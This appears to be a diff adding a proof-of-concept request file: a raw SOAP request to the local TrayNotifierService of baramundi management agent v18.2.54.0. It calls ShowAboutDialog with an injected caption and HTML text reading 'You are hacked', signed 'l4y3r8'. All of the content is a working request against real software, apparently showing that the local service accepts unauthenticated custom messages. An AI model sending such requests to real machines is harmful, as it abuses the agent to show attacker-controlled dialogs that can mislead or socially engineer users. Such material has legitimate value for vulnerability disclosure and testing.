@@ -1,0 +1,38 @@
+POST http://localhost:11001/traynotifierservice HTTP/1.1
+User-Agent: gSOAP/2.7
+Content-Type: text/xml; charset=utf-8
+Content-Length: 1149
+Connection: close
+SOAPAction: ""
+Host: localhost:11001
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:traynotifierservice="urn:TrayNotifierService">
+
+	<SOAP-ENV:Body><traynotifierservice:ShowAboutDialog>
+		<Caption>About hacked baramundi agent :-) v18.2.54.0</Caption>
+		<TickerText>
+		&lt;html&gt;
+			&lt;body&gt;
+				&lt;font size=&quot;+2&quot; face=&quot;Helvetica, Arial&quot;&gt;
+					&lt;CENTER&gt;
+						&lt;br&gt;
+						CUSTOM SOAP REQUEST &lt;br&gt;
+						You are hacked &lt;br&gt;
+						best regards, l4y3r8&lt;br&gt;
+						&lt;br&gt;
+						www.baramundi.de&lt;br&gt;
+						info@baramundi.de
+					&lt;/CENTER&gt;
+				&lt;/font&gt;
+			&lt;/body&gt;
+		&lt;/html&gt;
+		</TickerText>
+		<Hyperlink>http://www.baramundi.de</Hyperlink>
+		<VersionInfos><m-Module>BARACMN.DLL</m-Module><m-Version>18.2.54.0</m-Version><m-Path>C:\PROGRAM FILES (X86)\BARAMUNDI\BMA</m-Path></VersionInfos>
+		</traynotifierservice:ShowAboutDialog>
+	</SOAP-ENV:Body>
+	
+</SOAP-ENV:Envelope>
